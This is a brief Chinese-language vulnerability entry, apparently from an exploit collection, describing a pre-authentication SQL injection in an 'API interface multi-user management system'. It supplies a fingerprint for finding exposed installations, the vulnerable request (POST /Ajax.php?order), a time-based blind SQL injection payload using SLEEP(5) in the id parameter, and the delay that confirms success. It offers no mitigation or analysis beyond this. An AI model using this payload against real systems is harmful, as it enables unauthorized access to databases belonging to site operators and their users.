# API接口调用多用户管理系统Ajax存在前台SQL注入漏洞

API ｜ SQL注入 ｜ —
- **指纹**：`"./assets/layuiadmin/style/res/logo.png"`
- **请求**：`POST /Ajax.php?order HTTP/1.1`

**Payload**
```
id=11' AND (SELECT 1465 FROM (SELECT(SLEEP(5)))sMaC)-- Gxag
```
- **响应特征**：200 响应时间>=5s
响应内容